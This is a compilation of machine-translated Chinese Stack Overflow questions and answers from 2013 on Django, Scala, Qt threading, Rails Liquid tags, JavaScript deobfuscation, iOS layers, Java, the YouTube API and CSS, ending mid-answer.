> 时间：2013-04-18T19:23:26.753
> 
> 标签：mysql, django, amazon-ec2, django-queryset, rds

我有 4 个 EC2 服务器运行带有 uWSGI 的 Django 1.3.2 应用程序。他们都在 Amazon RDS 上共享一个 MySQL 服务器。我遇到了一些行为，如果通过管理员创建了新对象，我尝试：

```
get_object_or_404(Class, pk=new_object.pk) 
```

有时它会找到一个对象，但有时它会返回 404。

会发生什么？

这就是我使用 get_object_or_404 的方式：

```
# Module level variables
if settings.DEBUG:
    articles = News.objects.filter(status='live')
else:
    articles = News.objects.all()

dev view(request, slug):
    article = get_object_or_404(articles, slug=slug)
    .... 
```

如果我重新启动所有 uWSGI 进程，问题就会消失。

我尝试过的问题和事情：

1.  模块级变量是问题吗？我试图调试这个，但由于查询集是懒惰的，它似乎不是问题。
2.  是缓存问题吗？我已经重新启动了 memcache 并清除了 Nginx 的缓存，但问题仍然存在。
3.  是RDS的问题吗？我还没有找到这个问题的答案。
4.  是查询集缓存问题吗？我还没有找到这个问题的答案，也不知道如何。

一切都在单个服务器上按预期工作，但是一旦有多个服务器，我就会开始体验这种行为。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:12:51.433

模块级变量绝对是个问题——查询集只有在不使用（迭代、评估等）时才是“惰性”的，一旦你开始检索记录，它就会填充缓存（提示：Django 是开源的，当文档不够时，您可以只 ReadTheCode(tm)）。

如果您使用 InnoDB 表，您可能还会遇到事务隔离级别的问题（参见 Django 在最后一点上的文档）。

# scala - 可变堆栈抛出异常的Scala实现

> ID：16091411
> 
> 赞同：0
> 
> 时间：2013-04-18T19:23:44.037
> 
> 标签：scala

这是 Stack 的可变实现：

```
class LinkedStackGeneric {

  var first : NodeGeneric = _

  def isEmpty : Boolean  = {
    first == null
  }

  def push(itemName : Any) = {
    val oldFirst = first
    first = new NodeGeneric(itemName , oldFirst)
  } 

  def pop = {
    first = first.next

    first.itemName

  }

}

      class NodeGeneric(val itemName : Any , val next : NodeGeneric) {}

   println("*********** testing LinkedStackGeneric *****************")

       val generic = new LinkedStackGeneric
       generic.push("test")
       generic.push("here");
       println(generic.isEmpty)
       println(generic.pop);
       println(generic.isEmpty)
       println(generic.pop);
       println(generic.isEmpty) 
```

当我运行此代码时，它会产生以下内容：

```
*********** testing LinkedStackGeneric *****************
false
test
false
Exception in thread "main" java.lang.NullPointerException
    at LinkedStackGeneric.pop(LinkedStackGeneric.scala:19)
    at StacksAndQueuesTest$.main(StacksAndQueuesTest.scala:37)
    at StacksAndQueuesTest.main(StacksAndQueuesTest.scala) 
```

这是导致错误的行：

```
println(generic.pop); 
```

是什么导致了这个异常，我没有正确地将项目推入堆栈吗？因为我推了两个项目：

```
 generic.push("test")
   generic.push("here"); 
```

不应该抛出这个异常吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:35:02.043

修正你的`pop`方法。您的执行顺序导致了问题...

```
 def pop = {
    val ret  = first.itemName
    first = first.next
    ret
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:39:52.867

对 pop 的第二次调用首先设置为`null`，然后您尝试`itemName`在该空值上调用该方法

# c++ - 我不确定为什么我的 QThread 模式会阻塞

> ID：16091416
> 
> 赞同：0
> 
> 时间：2013-04-18T19:23:58.570
> 
> 标签：c++, multithreading, qt, qthread

我看过很多关于 QThread 和在 QThreads 之间移动 QObjects 的帖子和文章，但唉，它仍然让我头疼。这是我试图采用的模式：

```
#include "connectionthread.h"
#include <cassert>

ConnectionThread::ConnectionThread(ConnectionPtr const &connectionPtr) :
                               worker(NULL),
                               m_connectionPtr(connectionPtr)
{
    connect(this, SIGNAL(executeSignal()), this, SLOT(loginProcess()));
}

void
ConnectionThread::start()
{
    if(worker) {
        if(worker->isRunning()) {
            worker->quit();
        }
        delete worker;
    }
    worker = new QThread;
    connect(worker, SIGNAL(started()), this, SLOT(run()));
    worker->start();
}

void
ConnectionThread::run()
{
    emit executeSignal();
}

void
ConnectionThread::loginProcess()
{
    m_connectionPtr->Connect();
} 
```

现在在主 GUI 线程中创建了一个实例，但是当最终调用 loginProcess 时，它会阻塞直到完成，这会导致我的应用程序的 GUI 挂起。请注意，如果我将逻辑代码直接放入 run 函数并省略如下信号，则不会观察到差异：-

```
void
ConnectionThread::run() 
{
    m_connectionPtr->Connect();
} 
```

所以我假设我需要将“this”移动到名为 worker 的线程中，例如：

```
void
ConnectionThread::start()
{
    if(worker) {
        if(worker->isRunning()) {
            worker->quit();
        }
        delete worker;
    }
    worker = new QThread;
    this->moveToThread(worker);
    connect(worker, SIGNAL(started()), this, SLOT(run()));
    worker->start();
} 
```

但这给了我

```
QObject: Cannot create children for a parent that is in a different thread. 
```

我不确定为什么会这样，但是因为创建了 ConnectionThread 的一个实例并且它的 start 函数是从另一个线程调用的。让我们称这个其他线程为 GuiThread。这意味着 GuiThread 具有控制权，因此应该能够将 ConnectionThread 实例的所有权转移给工作线程。

我尚未完全探索的最后一种可能性是将 m_connectionPtr 移动到工作线程的可能性。

关于上述模式的任何想法，我如何改进它，以及一般我如何防止它阻塞？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T09:33:28.760

~~编辑 1：以下是我提出的解决方案，但它实际上并没有按预期工作，因为 worker 永远不会发出 finished() 信号~~

编辑 2：修复了触发的完成信号，但我仍然无法将 m_connectionPtr 移回 moveConnectionPtrBack 内的主线程。给出错误“QObject::moveToThread: 当前线程 (0x102900380) 不是对象的线程 (0x10493b740)。无法移动到目标线程 (0x102900380)”

所以，我想我已经知道该怎么做：解决方案似乎是将 ConnectionPtr 的线程所有权转移到工作线程：

```
#include "connectionthread.h"

ConnectionThread::ConnectionThread(ConnectionPtr const &connectionPtr) :
                               worker(NULL),
                               m_connectionPtr(connectionPtr)
{
    // EDIT 2 added bit -- m_connectionPtr sends signal when work finished
    connect(m_connectionPtr.data(), 
            SIGNAL(connectFinishedSignal()), this, SLOT(quitThread()));
}

void
ConnectionThread::start()
{
    if(worker) {
        if(worker->isRunning()) {
            worker->quit();
        }
        delete worker;
    }
    worker = new QThread;
    m_connectionPtr->moveToThread(worker);
    connect(worker, SIGNAL(started()), m_connectionPtr.data(), SLOT(Connect()));
    connect(worker, SIGNAL(finished()), this, SLOT(moveConnectionPtrBack()));
    worker->start();
}

void
ConnectionThread::moveConnectionPtrBack()
{
    // this call failing still
    m_connectionPtr->moveToThread(QApplication::instance()->thread());
}

// EDIT 2 added bit; quitting causes worker to send finished signal() which causes
// correct triggering of moveConnectionPtrBack() function
void
ConnectionThread::quitThread()
{
    worker->quit();
} 
```

（注意 m_connectionPtr 是“Connection”的共享 ptr，它本身是从 QObject 派生的，但没有父级；同样，ConnectionThread 是从 QObject 派生的，但同样没有父级）。

由于 m_connectionPtr 将来也被其他线程使用，我还必须将它再次移回主线程，如 moveConnectionPtrBack 插槽所示。

似乎可以解决问题，但总体而言并非完全没有错误。

# ruby-on-rails - Rails3 和 Liquid 初始化错误

> ID：16091418
> 
> 赞同：1
> 
> 时间：2013-04-18T19:24:01.050
> 
> 标签：ruby-on-rails, ruby-on-rails-3, liquid

嗨，我有一个带有 gem Liquid 模板的 Rails 3 应用程序。问题是我的自定义标签出现此错误。我将使用 wiki 的示例。

在我的 /lib/ 中，我为我的自定义标签创建了一个 random.rb

```
 class Random < Liquid::Tag

   def initialize(tag_name, max, tokens)
     super
     @max = max.to_i
   end

   def render(context)
     rand(@max).to_s
   end
end 
```

在我的初始化程序文件夹中，一个liquid.rb 用于注册该标签。

```
Liquid::Template.register_tag('random', Random) 
```

在控制台中

```
@template = Liquid::Template.parse("{% random 5 %}") 
```

我得到这个错误：

```
ArgumentError: wrong number of arguments (3 for 0..1)
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/block.rb:28:in `initialize'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/block.rb:28:in `new'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/block.rb:28:in `parse'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/document.rb:5:in `initialize'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/template.rb:58:in `new'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/template.rb:58:in `parse'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/liquid-2.5.0/lib/liquid/template.rb:46:in `parse'
from (irb):14
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/railties-3.2.13/lib/rails/commands/console.rb:47:in `start'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/railties-3.2.13/lib/rails/commands/console.rb:8:in `start'
from /Users/Artau/.rvm/gems/ruby-1.9.3-p385/gems/railties-3.2.13/lib/rails/commands.rb:41:in `<top (required)>'
from script/rails:6:in `require'
from script/rails:6:in `<main>' 
```

但如果我输入：

```
 1.9.3-p385 :004 > @template = Liquid::Template.parse("{{random 5}}")
 => #<Liquid::Template:0x007fa36b554108 @root=#<Liquid::Document:0x007fa36b553de8 @nodelist=[#<Liquid::Variable:0x007fa36b5536e0 @markup="random 5", @name="random", @filters=[]>]>> 
```

当我渲染时：

```
 1.9.3-p385 :005 > @template.render
 => "" 
```

有任何想法吗？

谢谢

我在 Rails 3.2.13

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:26:19.243

尝试重命名您的类，因为在标准 ruby​​ 库中已经有一个名为 Random 的类。

# javascript - 解密javascript文件

> ID：16091419
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:24:04.220
> 
> 标签：javascript, encryption, hex

我遇到了一个我以前从未见过的 javascript 文件的问题。我什至不知道它是如何工作的，我正在发布文件的某些部分，请帮助我如何解密这样的文件。这是分配给我的任务，我在互联网上搜索过，但一无所获

```
$(document)[_0xbad7[169]](function ()
{
    var _0x99f1x1=false;
    var _0x99f1x2=false;
    var _0x99f1x3=false;
    var _0x99f1x4=false;
    var _0x99f1x5=_0xbad7[0];
    var _0x99f1x6=0;
    var _0x99f1x7=1;
    $(_0xbad7[2])[_0xbad7[1]](function (_0x99f1x8)
    {
    }
    );
    function _0x99f1x9()
    {
        $(_0xbad7[5])[_0xbad7[4]](_0xbad7[3],_0xbad7[0]);
        $(_0xbad7[9])[_0xbad7[8]](_0xbad7[6],_0xbad7[7]);
        $(_0xbad7[10])[_0xbad7[8]](_0xbad7[6],_0xbad7[7]);
        $(_0xbad7[11])[_0xbad7[8]](_0xbad7[6],_0xbad7[7]);
        $(_0xbad7[12])[_0xbad7[8]](_0xbad7[6],_0xbad7[7]);
        _0x99f1x7=1;
    }
    ;
    function _0x99f1xa(_0x99f1xb)
    {
        $(_0xbad7[14])[_0xbad7[8]](_0xbad7[13],_0x99f1xb);
    }
    ;
    function _0x99f1xc()
    {
        _0x99f1x1f(_0xbad7[15],_0xbad7[16],_0xbad7[16]);
        _0x99f1x1f(_0xbad7[17],_0xbad7[16],_0xbad7[18]);
        _0x99f1x1f(_0xbad7[19],_0xbad7[16],_0xbad7[20]);
        _0x99f1x1f(_0xbad7[21],_0xbad7[16],_0xbad7[22]);
        _0x99f1x1f(_0xbad7[23],_0xbad7[24],_0xbad7[16]);
        _0x99f1x1f(_0xbad7[25],_0xbad7[24],_0xbad7[18]);
        _0x99f1x1f(_0xbad7[26],_0xbad7[24],_0xbad7[20]);
        _0x99f1x1f(_0xbad7[27],_0xbad7[24],_0xbad7[22]);
    }
    ; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:32:49.817

该代码是普通的 JavaScript 代码，已使用工具（例如[jsobfuscate](http://www.jsobfuscate.com/index.php)）进行了混淆处理，这对任何想要窃取或复制它的人来说都是一种痛苦。从技术上讲，如果作者花时间尝试保护他的代码，那就意味着你不能使用任何代码。但是，有一些[工具](http://jsbeautifier.org/)可以帮助您使混乱变得更容易理解，但它们仍然无法为您解决。

我可以快速看到，`0xbad7`这是一个包含大多数函数名称、选择器、函数参数等的数组。您可以做的一件事是在特定索引中包含的值和`0xbad7[x]`引用之间进行插值。

您可以使用以下类似的方法轻松自动化该过程，但是它不适用于对象引用，因为您最终会得到`[object Object]`，但是您可以使解决方案更加智能以找出对象的构造函数和事物像这样。

玩得开心！

[http://jsbin.com/#/agikay/1/edit](http://jsbin.com/#/agikay/1/edit)

```
//get a reference to the _0xbad7 array
//and do something like...
var _0xbad7 = ['item0', 'item1', 'item2', 'item3', 'item4', 'item5'],
    txt = document.querySelector('textarea');

txt.value = txt.value.replace(/_0xbad7\[(\d+)\]/g, function ($0, $1) {
  return _0xbad7[$1];
}); 
```

# ios - 我的 CATextLayer 在进行垂直翻转后变得模糊，CATransform3D

> ID：16091427
> 
> 赞同：1
> 
> 时间：2013-04-18T19:24:46.997
> 
> 标签：ios, objective-c, calayer, catransform3d

我的目标是：在初始化时，你可以看到“FRONT TEXT”，如果你点击图层，它会垂直翻转，你会看到“BACK TEXT”。

这是我的方法：

```
 /*CREATE CUSTOMLAYER*/
    customLayer                                 =   [[CALayer alloc] init];

    customLayer.backgroundColor                 =   [[UIColor colorWithRed:0.0/255 green:139.0/255 blue:149.0/255 alpha:1] CGColor];
    customLayer.opacity                         =   1;
    [customLayer setFrame:orangFrame];
    customLayer.anchorPoint                     =   CGPointMake(0.5, 0.5);
    [customLayer setMasksToBounds:YES];
    [customLayer setCornerRadius:3];

    // Draw a custom gradient
    gradients                                   =   [CAGradientLayer layer];
    gradients.frame                             =   customLayer.bounds;
    gradients.colors                            =   [NSArray arrayWithObjects:
                                                     (id)[UIColor colorWithWhite:1.0f alpha:0.1f].CGColor,
                                                     (id)[UIColor colorWithWhite:1.0f alpha:0.2f].CGColor,
                                                     (id)[UIColor colorWithWhite:0.75f alpha:0.2f].CGColor,
                                                     (id)[UIColor colorWithWhite:0.4f alpha:0.2f].CGColor,
                                                     (id)[UIColor colorWithWhite:1.0f alpha:0.4f].CGColor,
                                                     nil];

    /* CREATE A FRONTTEXTLAYER */
    frontTextLayer                              =   [[CATextLayer alloc] init];        
    CGRect labelFrame                           =   CGRectInset(customLayer.bounds, 5.0, 10.0);
    frontTextLayer.anchorPoint                  =   CGPointMake(0.5, 0.5);    
    [frontTextLayer setFrame:labelFrame];
    frontTextLayer.doubleSided                  =   YES;
    frontTextLayer.backgroundColor              =   [UIColor clearColor].CGColor;
    [frontTextLayer setFont:@"Montserrat-Regular"];
    [frontTextLayer setFontSize:16];    
    [frontTextLayer setString:@"FRONT TEXT"];
    [frontTextLayer setAlignmentMode:kCAAlignmentCenter];
    [frontTextLayer setForegroundColor:[[UIColor whiteColor] CGColor]];
    frontTextLayer.contentsScale                =   [[UIScreen mainScreen] scale];

    /* CREATE A BACKTEXTLAYER */
    backTextLayer                               =   [[CATextLayer alloc] init];        
    backTextLayer.anchorPoint                   =   CGPointMake(0.5, 0.5);        
    [backTextLayer setFrame:labelFrame];
    backTextLayer.doubleSided                   =   YES;
    backTextLayer.backgroundColor               =   [UIColor clearColor].CGColor;
    [backTextLayer setFont:@"Montserrat-Regular"];
    [backTextLayer setFontSize:16];        
    [backTextLayer setString:@"BACK TEXT"];
    [backTextLayer setAlignmentMode:kCAAlignmentCenter];
    [backTextLayer setForegroundColor:[[UIColor whiteColor] CGColor]];
    backTextLayer.contentsScale                 =   [[UIScreen mainScreen] scale];

    /* APPLY TRANSFORMATION FOR BACKTEXTLAYER */
    CATransform3D transfrom                     =   CATransform3DIdentity;
    transfrom.m34                               =   -1.0/ 500;
    transfrom                                   =   CATransform3DRotate(transfrom, degToRad(180.0), 1, 0, 0);
    backTextLayer.transform                     =   transfrom;

    [self.viewHolder.layer addSublayer:customLayer];
    [customLayer insertSublayer:gradients atIndex:0];    
    [customLayer addSublayer:frontTextLayer]; 
```

为了处理点击，我使用：

```
- (void)touchesEnded:(NSSet*)touches withEvent:(UIEvent*)event {
    UITouch *touch                      =   [[event allTouches] anyObject];
    CGPoint touchLocation               =   [touch locationInView:self.viewHolder];
    BOOL isLocatedIncustomLayer         =   CGRectContainsPoint(customLayer.frame, touchLocation);

    [self transformation:isLocatedIncustomLayer];
}

-(void)transformation:(BOOL)value {
    if ( value) {
        if ( !isClicked ) {
            CATransform3D transfrom     =   CATransform3DIdentity;
            transfrom.m34               =   -1.0/ 500;
            transfrom                   =   CATransform3DRotate(transfrom, degToRad(180.0), 1, 0, 0);                    

            /* REMOVE FRONTTEXTLAYER */
            [frontTextLayer removeFromSuperlayer];
            [CATransaction setCompletionBlock:^{
                [CATransaction begin];
                [CATransaction setAnimationDuration:3];
                customLayer.transform   =   transfrom;

                /* ADD BACKTEXTLAYER */
                [customLayer addSublayer:backTextLayer];
                [CATransaction commit];

            }];

            isClicked       =   TRUE;

        }
        else {
            /* REMOVE BACKTEXTLAYER */
            [backTextLayer removeFromSuperlayer];

            [CATransaction setCompletionBlock:^{
                [CATransaction begin];
                [CATransaction setAnimationDuration:.5];
                customLayer.transform   =   CATransform3DIdentity;

                /* ADD FRONTTEXTLAYER */
                [customLayer addSublayer:frontTextLayer];
                frontTextLayer.transform         =   CATransform3DIdentity;
                [CATransaction commit];

            }];

            isClicked       =   FALSE;
        }
    }
} 
```

`BACKTEXT`除了改造之后，一切都是我所期待的。看起来不是很清楚。图片如下。

正文：

![正文](https://i.stack.imgur.com/IuPFe.png)

回文：

![返回文本](https://i.stack.imgur.com/LKR6m.png)

欢迎所有评论！

# operating-system - 是否有使用 Lisp 开发的操作系统？

> ID：16091428
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:24:47.607
> 
> 标签：operating-system, lisp, common-lisp

我想知道是否有单独使用 LISP 开发的操作系统？

我还想知道是否有任何开源项目在 LISP 下开发操作系统。该语言非常令人兴奋，我期待主要在 LISP 中建立我的编程。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:52:20.803

Movitz 是一个用 Common Lisp 编写的操作系统。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:01:26.540

你的意思是像大型的旧[Lisp 机器](https://en.wikipedia.org/wiki/Lisp_machine)？

# java - 关于从设计角度理解 Java 代码段

> ID：16091429
> 
> 赞同：0
> 
> 时间：2013-04-18T19:24:49.277
> 
> 标签：java, inheritance, access-specifier

我试图了解一个基于 java 的开源项目，它有一个代码段，如

```
protected SimpleBinaryModel(ExampleSet exampleSet, double threshold) {
    super(exampleSet);
    this.threshold = threshold;
} 
```

虽然我大致可以猜到这个函数的目的是如何实现的，但我不太明白将这个函数定义为“protected”并将“exampleSet”定义为“super”的原因。从 OO 设计的角度来看，以这种方式定义它们的一般优势是什么？

此外，`this.threshold = threshold;`目标是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:27:56.880

这不是一个函数。这是一个`constructor`。

`super(exampleSet);`表示基类有一个带有 ExampleSet 参数的构造函数。

并`this.threshold = threshold;`用参数的值初始化当前类的阈值字段`threshold`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:29:13.453

1.  “protected”关键字声明该方法只能被派生类或声明类引用。去阅读[在 Java 中，默认、公共、受保护和私有之间的区别](https://stackoverflow.com/questions/215497/in-java-whats-the-difference-between-public-default-protected-and-private)

2.  “super”正在调用父类的构造函数。

3.  this.threshold = threshold 将输入参数分配给对象实例的本地数据成员。

您可能想阅读一些基本的 Java 教程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:29:17.530

A`protected constructor`意味着其他类不能使用实例化对象`new`，通常还有另一种方法来构建它们的实例（如[工厂方法](http://www.codeproject.com/Articles/68670/The-Factory-Pattern)）。因为它是受保护的，子类仍然可以覆盖它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-18T19:28:19.920

`SimpleBinaryModel`是一个构造函数。

`super(exampleSet)`正在调用超类构造函数。它必须始终是第一行。

`protected`可以被同一个包的类和任何包中的子类访问。

# php - YouTube API - 直接上传 - 413 请求实体太大

> ID：16091432
> 
> 赞同：1
> 
> 时间：2013-04-18T19:25:03.570
> 
> 标签：php, sockets, upload, youtube-api

我一直在尝试通过直接上传将视频上传到 YouTube API。我终于破解了 OAuth 流程并且我有一个有效的令牌。我真的只需要在 YouTube 上做两件事，验证和上传。我没有浏览或使用任何其他功能。用户将视频上传到这个网站，我将它们发送到 YouTube 进行播放。

我觉得我自己已经完成了 80-90% 的路，所以我不想放弃它并使用 Google 提供的 Zend 库。

问题：当我发送请求时，我得到以下响应：

```
HTTP/1.1 413 Request Entity Too Large
Content-Type: text/html; charset=UTF-8
Content-Length: 171
Date: Thu, 18 Apr 2013 18:33:22 GMT
Expires: Thu, 18 Apr 2013 18:33:22 GMT
Cache-Control: private, max-age=0
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Server: GSE
Connection: close 
```

如果我打开警告，我还会收到 Broken Pipe 警告，这可能只是尝试通过关闭/拒绝连接上传数据的代码。

我的要求是这样的：

```
POST /feeds/api/users/default/uploads HTTP/1.1 
Host: gdata.youtube.com Connection: close 
User-Agent: PHP Accept-encoding: identity 
Authorization: Bearer <TOKEN IS HERE> 
GData-Version: 2.0 
X-GData-Key: key=<MYKEYISHERE>
Slug: throwing_can.mp4 
Content-Type: multipart/related; boundary="5170429d1b193" 
Content-Length: 3920610 
```

将文件本身分块并写入流。

```
function ytapi_write_file($handle, $path, $chunksize = 8192){
    $filehandle = fopen($path, 'r');
    while(!feof($filehandle)){
        fwrite($handle, fread($filehandle, $chunksize));
    }
    fclose($filehandle);
    $filehandle = null;
}

function ytapi_write($handle, $request){
    fwrite($handle, $request);
    return $request;
} 
```

像这样。

```
ytapi_write($handle, $start); //This writes the header.
ytapi_write_file($handle, $path, 8192); //This writes the file raw/binary.
ytapi_write($handle, $end); //This writes the final boundary. 
```

另外，我将其用于标题信息：

```
$_header = array(
    'Host'=>'gdata.youtube.com',
    'Connection'=>'close',
    'User-Agent'=>'PHP',
    'Accept-encoding'=>'identity'
); 
```

关于我做错了什么的任何想法？如果需要，我可以提供更多信息。我上传的文件略大于 3MB，该文件位于相关服务器上。我已经确认位置是正确的。

## 更新

更改为 uploads.gdata.youtube.com

现在我收到此错误消息：

```
Host: uploads.gdata.youtube.com
Connection: close
User-Agent: PHP
Accept-encoding: identity
tcp://uploads.gdata.youtube.com:80HTTP/1.1 400 Bad Request
Server: HTTP Upload Server Built on Apr 8 2013 13:06:58 (1365451618)
X-GData-User-Country: US
Content-Type: application/vnd.google.gdata.error+xml
X-GUploader-UploadID: <SOME ID>
Date: Thu, 18 Apr 2013 19:42:14 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 228
Connection: close 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:38:25.660

这是我的实现：

```
$data = '<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<entry xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" xmlns:yt="http://gdata.youtube.com/schemas/2007">
    <media:group>
        <media:title type="plain">' . $title . '</media:title>
        <media:description type="plain">' . trim($description) . '</media:description>
        <media:keywords>' . $tags . '</media:keywords>
        <media:category scheme="http://gdata.youtube.com/schemas/2007/categories.cat">Music</media:category>
    </media:group>
</entry>';
$headers = array(
    'Authorization: GoogleLogin auth=' . $auth,
    'GData-Version: 2',
    'X-GData-Key: key=<KEY>',
    'Slug: ' . basename($videoPath)
);

$tmpfname = tempnam("/tmp", "youtube");
$handle = fopen($tmpfname, "w");
fwrite($handle, $data);
fclose($handle);

$post = array(
    'xml' => '@' . $tmpfname . ";type=application/atom+xml",
    'video' => '@' . $videoPath . ";type=video/mp4",
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "uploads.gdata.youtube.com/feeds/api/users/default/uploads");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch); 
```

# api - 我可以使用 Foursquare API 查找场地中的所有公开头像吗？

> ID：16091444
> 
> 赞同：0
> 
> 时间：2013-04-18T19:26:03.950
> 
> 标签：api, foursquare, photos

我有兴趣提取最近在某个地点签到的人的所有公开个人资料图片以显示在侧面列表视图中，这在某种程度上是表示该地点受欢迎程度的一种方式，并且想知道这是否可以通过他们的 API 实现. 谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:39:43.440

`venue`端点不会为您提供详细的历史访问权限，以了解谁在那里签到。它将此信息折叠到`stats`字段中，从而为您提供在场地签到的总数以及已签到场地的用户总数。

`hereNow`您可以通过使用该字段提供的数据来接近您正在寻找的内容。这会告诉您谁“当前”签到了场地，将用户分为`friends`和`others`。

`venue`有关以下端点的完整详细信息：

[https://developer.foursquare.com/docs/responses/venue](https://developer.foursquare.com/docs/responses/venue)

# c++ - 无法插入已由另一个 QTableWidget 拥有的项目

> ID：16091446
> 
> 赞同：0
> 
> 时间：2013-04-18T19:26:07.623
> 
> 标签：c++, qt, qtablewidget, qtablewidgetitem

我遇到了 QTableWidgetTable 的问题，在我运行 FindTableItems 函数后，它会将行/数重置为适当的大小，但不会将任何数据放入单元格中。

我可以看到对象保存了正确的数据。我没有收到任何编译错误，但调试器记下了：

QTableWidget：无法插入已由另一个 QTableWidget 拥有的项目

我不明白的是我只有一个 tablewidget 吗？怎么了？我也愿意以不同的方式做到这一点。

```
void MainWindow::FindTableItems(QString searchItem)
{
    QList<int> matches;

    QList<QList<QTableWidgetItem*> > allRows;

    QList<QTableWidgetItem*> tempRow;

    QList<QTableWidgetItem *> tempTable = ui->tableWidget->findItems(searchItem,Qt::MatchContains);
    foreach(QTableWidgetItem *rowPtr,tempTable)
    {
    int currentRow = rowPtr->row();
    matches.append(currentRow);
    }

    for(int i = 0; i < ui->tableWidget->rowCount(); ++i)
    {
        if(matches.contains(i))
        {

            QTableWidgetItem *tempCaseNameItem = new QTableWidgetItem;
            QTableWidgetItem *tempInterviewNameItem = new QTableWidgetItem;
            QTableWidgetItem *tempInterviewerNameItem = new QTableWidgetItem;
            QTableWidgetItem *tempIntervieweeNameItem = new QTableWidgetItem;
            QTableWidgetItem *tempObserverNameItem = new QTableWidgetItem;
            QTableWidgetItem *tempDateItem = new QTableWidgetItem;

            tempCaseNameItem->setText(ui->tableWidget->item(i,0)->text());
            tempRow.append(tempCaseNameItem);

            tempInterviewNameItem->setText(ui->tableWidget->item(i,1)->text());
            tempRow.append(tempInterviewNameItem);

            tempInterviewerNameItem->setText(ui->tableWidget->item(i,2)->text());
            tempRow.append(tempInterviewerNameItem);

            tempIntervieweeNameItem->setText(ui->tableWidget->item(i,3)->text());
            tempRow.append(tempIntervieweeNameItem);

            tempObserverNameItem->setText(ui->tableWidget->item(i,4)->text());
            tempRow.append(tempObserverNameItem);

            tempDateItem->setText(ui->tableWidget->item(i,5)->text());
            tempRow.append(tempDateItem);

            allRows.append(tempRow);
        }
    }
    ui->tableWidget->setRowCount(0);
    foreach(QList<QTableWidgetItem*> rowItems, allRows)
    {
        int row = ui->tableWidget->rowCount();
        ui->tableWidget->insertRow(row);

        foreach(QTableWidgetItem *rowItem, rowItems)
        {
            for(int i = 0; i < 6; ++i)
            {
                ui->tableWidget->setItem(row, i, rowItem);
               // ui->tableWidget->item(row, i)->setTextAlignment(Qt::AlignVCenter);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T22:12:08.520

我有一个坏的 for 循环，在底部，抱歉应该多加注意

# android - Nexus 4，Sherlock 动作条

> ID：16091451
> 
> 赞同：0
> 
> 时间：2013-04-18T19:26:26.037
> 
> 标签：android, tabs, android-actionbar

我们在 Sherlock 中的样式标签有问题。从 Nexus 4 捕获的这张图片（一条未完成的橙色线）可以看到问题：

![在此处输入图像描述](https://i.stack.imgur.com/mJQtd.png) 我们已经在其他一些分辨率较低的设备上对此进行了测试，但没关系。

谢谢任何回复

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:29:44.497

可能与您使用的可绘制对象的分辨率有关。hdpi/xhdpi 文件夹中的选项卡背景是否有更高分辨率的项目？

# css - 如何将元素的高度设置为与其父元素相同

> ID：16091463
> 
> 赞同：0
> 
> 时间：2013-04-18T19:27:17.597
> 
> 标签：css, dom

我在另一个“主要内容”中有一个名为“content-left”的 div。我想让孩子 div 假设父母身高的 100%。

```
#main_content {
display: table;
width: 99%;
margin-left: auto;
margin-right: auto;
}

#content-left {
width: 250px;
float: left;
display: table-cell;
padding-bottom: 8px;
background-color: #F6F5F4;
height: 100%;
}
#content-rightside {
width: 782px;
float: left;
display: block;
padding-left: 10px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T20:28:13.447

为了使`height: 100%;`CSS 规则起作用，元素的**每个**父元素都必须明确定义高度。这种类型的样式表将起作用：

```
html,
body,
#main-content,
#left-column,
#right-column
{
    height: 100%;
}

#left-column
{
    background-color: #ccc;
    float: left;
    width: 75%;
}

#right-column
{
    background-color: #eee;
    float: left;
    width: 25%;
} 
```

这里有一个小提琴供你看：http: [//jsfiddle.net/txReR/](http://jsfiddle.net/txReR/)

**更新**

如果您希望高度基于内容，请`display: table`像这样使用：

```
#main-content
{
    display: table;
    width: 100%;
}

#left-column
{
